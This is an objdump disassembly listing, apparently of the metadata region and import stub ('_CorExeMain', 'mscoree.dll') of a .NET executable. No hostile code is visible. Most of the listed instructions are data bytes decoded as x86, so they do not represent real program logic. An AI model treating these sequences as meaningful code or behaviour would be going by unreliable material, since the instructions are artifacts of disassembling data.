  40c245:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c24b:	07                   	pop    %es
  40c24c:	0a 12                	or     (%edx),%dl
  40c24e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c255:	08 12 81 
  40c258:	41                   	inc    %ecx
  40c259:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c25f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c264:	4d                   	dec    %ebp
  40c265:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c26a:	0e                   	push   %cs
  40c26b:	05 00 00 12 81       	add    $0x81120000,%eax
  40c270:	41                   	inc    %ecx
  40c271:	05 20 00 12 81       	add    $0x81120020,%eax
  40c276:	55                   	push   %ebp
  40c277:	06                   	push   %es
  40c278:	00 00                	add    %al,(%eax)
  40c27a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c27f:	00 01                	add    %al,(%ecx)
  40c281:	0e                   	push   %cs
  40c282:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c287:	01 11                	add    %edx,(%ecx)
  40c289:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c290:	41                   	inc    %ecx
  40c291:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c297:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c29e:	49                   	dec    %ecx
  40c29f:	0e                   	push   %cs
  40c2a0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c2a6:	0e                   	push   %cs
  40c2a7:	0e                   	push   %cs
  40c2a8:	0e                   	push   %cs
  40c2a9:	0e                   	push   %cs
  40c2aa:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c2af:	1c 07                	sbb    $0x7,%al
  40c2b1:	20 02                	and    %al,(%edx)
  40c2b3:	01 0e                	add    %ecx,(%esi)
  40c2b5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c2bb:	0a 02                	or     (%edx),%al
  40c2bd:	10 07                	adc    %al,(%edi)
  40c2bf:	06                   	push   %es
  40c2c0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c2c6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c2cc:	0e                   	push   %cs
  40c2cd:	02 05 20 00 12 81    	add    0x81120020,%al
  40c2d3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c2d9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c2df:	91                   	xchg   %eax,%ecx
  40c2e0:	04 20                	add    $0x20,%al
  40c2e2:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c2e5:	04 07                	add    $0x7,%al
  40c2e7:	02 02                	add    (%edx),%al
  40c2e9:	02 03                	add    (%ebx),%al
  40c2eb:	20 00                	and    %al,(%eax)
  40c2ed:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c2f0:	02 18                	add    (%eax),%bl
  40c2f2:	02 03                	add    (%ebx),%al
  40c2f4:	07                   	pop    %es
  40c2f5:	01 0e                	add    %ecx,(%esi)
  40c2f7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2fc:	9d                   	popf
  40c2fd:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c302:	1c 0a                	sbb    $0xa,%al
  40c304:	07                   	pop    %es
  40c305:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c30a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c30f:	20 01                	and    %al,(%ecx)
  40c311:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c317:	0e                   	push   %cs
  40c318:	08 08                	or     %cl,(%eax)
  40c31a:	06                   	push   %es
  40c31b:	07                   	pop    %es
  40c31c:	02 02                	add    (%edx),%al
  40c31e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c324:	0e                   	push   %cs
  40c325:	0e                   	push   %cs
  40c326:	0e                   	push   %cs
  40c327:	05 20 00 11 81       	add    $0x81110020,%eax
  40c32c:	ad                   	lods   %ds:(%esi),%eax
  40c32d:	05 00 00 12 81       	add    $0x81120000,%eax
  40c332:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c337:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c33d:	02 11                	add    (%ecx),%dl
  40c33f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c345:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c34c:	12 81 8d 
  40c34f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c355:	12 41 01             	adc    0x1(%ecx),%al
  40c358:	0e                   	push   %cs
  40c359:	05 20 01 01 13       	add    $0x13010120,%eax
  40c35e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c364:	00 06                	add    %al,(%esi)
  40c366:	00 02                	add    %al,(%edx)
  40c368:	0e                   	push   %cs
  40c369:	0e                   	push   %cs
  40c36a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c36f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c374:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c37a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c380:	c5 09                	lds    (%ecx),%ecx
  40c382:	00 02                	add    %al,(%edx)
  40c384:	02 11                	add    (%ecx),%dl
  40c386:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c38c:	07                   	pop    %es
  40c38d:	02 12                	add    (%edx),%dl
  40c38f:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c394:	01 02                	add    %eax,(%edx)
  40c396:	0e                   	push   %cs
  40c397:	10 02                	adc    %al,(%edx)
  40c399:	06                   	push   %es
  40c39a:	00 01                	add    %al,(%ecx)
  40c39c:	01 12                	add    %edx,(%edx)
  40c39e:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c3a4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c3ab:	0e                   	push   %cs
  40c3ac:	1c 11                	sbb    $0x11,%al
  40c3ae:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c3b4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c3bb:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c3c1:	05 07 20 02 12       	add    $0x12022007,%eax
  40c3c6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c3cd:	12 60 0e             	adc    0xe(%eax),%ah
  40c3d0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c3d5:	12 60 12             	adc    0x12(%eax),%ah
  40c3d8:	60                   	pusha
  40c3d9:	06                   	push   %es
  40c3da:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c3df:	60                   	pusha
  40c3e0:	10 10                	adc    %dl,(%eax)
  40c3e2:	01 01                	add    %eax,(%ecx)
  40c3e4:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c3e9:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c3ef:	1e                   	push   %ds
  40c3f0:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c3f3:	01 12                	add    %edx,(%edx)
  40c3f5:	60                   	pusha
  40c3f6:	09 20                	or     %esp,(%eax)
  40c3f8:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c3fe:	13 00                	adc    (%eax),%eax
  40c400:	07                   	pop    %es
  40c401:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c406:	12 60 04             	adc    0x4(%eax),%ah
  40c409:	20 00                	and    %al,(%eax)
  40c40b:	13 00                	adc    (%eax),%eax
  40c40d:	05 20 01 02 13       	add    $0x13020120,%eax
  40c412:	00 03                	add    %al,(%ebx)
  40c414:	07                   	pop    %es
  40c415:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c41c:	e5 07                	in     $0x7,%eax
  40c41e:	20 01                	and    %al,(%ecx)
  40c420:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c426:	20 01                	and    %al,(%ecx)
  40c428:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c42e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c431:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c437:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c43d:	00 02                	add    %al,(%edx)
  40c43f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c445:	0e                   	push   %cs
  40c446:	1c 00                	sbb    $0x0,%al
  40c448:	05 12 82 05 11       	add    $0x11058212,%eax
  40c44d:	82 09 0e             	orb    $0xe,(%ecx)
  40c450:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c455:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c45b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c460:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c466:	45                   	inc    %ebp
  40c467:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c46d:	4d                   	dec    %ebp
  40c46e:	1c 12                	sbb    $0x12,%al
  40c470:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c475:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c47a:	0e                   	push   %cs
  40c47b:	0b 00                	or     (%eax),%eax
  40c47d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c483:	00 12                	add    %dl,(%edx)
  40c485:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c48c:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c491:	4d                   	dec    %ebp
  40c492:	1c 12                	sbb    $0x12,%al
  40c494:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c499:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c49e:	0e                   	push   %cs
  40c49f:	17                   	pop    %ss
  40c4a0:	20 0a                	and    %cl,(%edx)
  40c4a2:	01 13                	add    %edx,(%ebx)
  40c4a4:	00 13                	add    %dl,(%ebx)
  40c4a6:	01 13                	add    %edx,(%ebx)
  40c4a8:	02 13                	add    (%ebx),%dl
  40c4aa:	03 13                	add    (%ebx),%edx
  40c4ac:	04 13                	add    $0x13,%al
  40c4ae:	05 13 06 13 07       	add    $0x7130613,%eax
  40c4b3:	13 08                	adc    (%eax),%ecx
  40c4b5:	13 09                	adc    (%ecx),%ecx
  40c4b7:	05 07 01 12 82       	add    $0x82120107,%eax
  40c4bc:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c4c1:	0e                   	push   %cs
  40c4c2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c4c7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c4cd:	06                   	push   %es
  40c4ce:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c4d4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c4da:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c4df:	20 01                	and    %al,(%ecx)
  40c4e1:	01 11                	add    %edx,(%ecx)
  40c4e3:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c4ea:	82 31 05             	xorb   $0x5,(%ecx)
  40c4ed:	20 00                	and    %al,(%eax)
  40c4ef:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c4f5:	01 12                	add    %edx,(%edx)
  40c4f7:	61                   	popa
  40c4f8:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c4fe:	08 20                	or     %ah,(%eax)
  40c500:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c506:	08 1a                	or     %bl,(%edx)
  40c508:	07                   	pop    %es
  40c509:	0a 12                	or     (%edx),%dl
  40c50b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c512:	21 1d 05 
  40c515:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c51a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c521:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c526:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c52c:	45                   	inc    %ebp
  40c52d:	08 08                	or     %cl,(%eax)
  40c52f:	04 07                	add    $0x7,%al
  40c531:	02 02                	add    (%edx),%al
  40c533:	08 09                	or     %cl,(%ecx)
  40c535:	00 02                	add    %al,(%edx)
  40c537:	01 12                	add    %edx,(%edx)
  40c539:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c53d:	4d                   	dec    %ebp
  40c53e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c543:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c549:	05 08 05 07 07       	add    $0x7070508,%eax
  40c54e:	02 12                	add    (%edx),%dl
  40c550:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c554:	08 07                	or     %al,(%edi)
  40c556:	04 12                	add    $0x12,%al
  40c558:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c55d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c562:	1c 06                	sbb    $0x6,%al
  40c564:	07                   	pop    %es
  40c565:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c56b:	20 01                	and    %al,(%ecx)
  40c56d:	13 00                	adc    (%eax),%eax
  40c56f:	08 04 07             	or     %al,(%edi,%eax,1)
  40c572:	01 12                	add    %edx,(%edx)
  40c574:	60                   	pusha
  40c575:	0e                   	push   %cs
  40c576:	07                   	pop    %es
  40c577:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c57c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c582:	12 60 07             	adc    0x7(%eax),%ah
  40c585:	07                   	pop    %es
  40c586:	04 08                	add    $0x8,%al
  40c588:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c58d:	20 01                	and    %al,(%ecx)
  40c58f:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c595:	64 04 00             	fs add $0x0,%al
  40c598:	01 0b                	add    %ecx,(%ebx)
  40c59a:	0a 04 00             	or     (%eax,%eax,1),%al
  40c59d:	01 0b                	add    %ecx,(%ebx)
  40c59f:	0e                   	push   %cs
  40c5a0:	04 00                	add    $0x0,%al
  40c5a2:	01 0b                	add    %ecx,(%ebx)
  40c5a4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c5a9:	0c 06                	or     $0x6,%al
  40c5ab:	00 01                	add    %al,(%ecx)
  40c5ad:	0b 11                	or     (%ecx),%edx
  40c5af:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c5b6:	04 00 01 
  40c5b9:	0a 0e                	or     (%esi),%cl
  40c5bb:	04 00                	add    $0x0,%al
  40c5bd:	01 0a                	add    %ecx,(%edx)
  40c5bf:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c5c4:	0c 06                	or     $0x6,%al
  40c5c6:	00 01                	add    %al,(%ecx)
  40c5c8:	0a 11                	or     (%ecx),%dl
  40c5ca:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c5d1:	04 00 01 
  40c5d4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c5d9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c5dd:	ad                   	lods   %ds:(%esi),%eax
  40c5de:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c5e3:	0c 07                	or     $0x7,%al
  40c5e5:	07                   	pop    %es
  40c5e6:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c5ec:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c5f1:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c5f7:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c5fd:	12 60 1d             	adc    0x1d(%eax),%ah
  40c600:	0e                   	push   %cs
  40c601:	0e                   	push   %cs
  40c602:	08 12                	or     %dl,(%edx)
  40c604:	60                   	pusha
  40c605:	08 05 07 01 12 81    	or     %al,0x81120107
  40c60b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c610:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c617:	05 08 08 06 00       	add    $0x60808,%eax
  40c61c:	02 07                	add    (%edi),%al
  40c61e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c623:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c62a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c630:	00 02                	add    %al,(%edx)
  40c632:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c638:	02 0b                	add    (%ebx),%cl
  40c63a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c63f:	02 06                	add    (%esi),%al
  40c641:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c646:	02 0a                	add    (%edx),%cl
  40c648:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c64d:	03 12                	add    (%edx),%edx
  40c64f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c656:	07 02 12 
  40c659:	60                   	pusha
  40c65a:	02 04 07             	add    (%edi,%eax,1),%al
  40c65d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c663:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c668:	04 1d                	add    $0x1d,%al
  40c66a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c66f:	06                   	push   %es
  40c670:	07                   	pop    %es
  40c671:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c677:	00 01                	add    %al,(%ecx)
  40c679:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c67e:	06                   	push   %es
  40c67f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c685:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c68b:	05 08 20 02 01       	add    $0x1022008,%eax
  40c690:	12 61 11             	adc    0x11(%ecx),%ah
  40c693:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c697:	04 12                	add    $0x12,%al
  40c699:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c6a0:	1d 05 00 
  40c6a3:	00 cc                	add    %cl,%ah
  40c6a5:	c6 00 00             	movb   $0x0,(%eax)
	...
  40c6b0:	ee                   	out    %al,(%dx)
  40c6b1:	c6 00 00             	movb   $0x0,(%eax)
  40c6b4:	00 20                	add    %ah,(%eax)
	...
  40c6ca:	00 00                	add    %al,(%eax)
  40c6cc:	e0 c6                	loopne 0x40c694
	...
  40c6e2:	5f                   	pop    %edi
  40c6e3:	43                   	inc    %ebx
  40c6e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6e5:	72 45                	jb     0x40c72c
  40c6e7:	78 65                	js     0x40c74e
  40c6e9:	4d                   	dec    %ebp
  40c6ea:	61                   	popa
  40c6eb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c6f2:	72 65                	jb     0x40c759
  40c6f4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c6f8:	6c                   	insb   (%dx),%es:(%edi)
  40c6f9:	00 00                	add    %al,(%eax)
  40c6fb:	00 00                	add    %al,(%eax)
  40c6fd:	00 ff                	add    %bh,%bh
  40c6ff:	25 00 20 40 00       	and    $0x402000,%eax
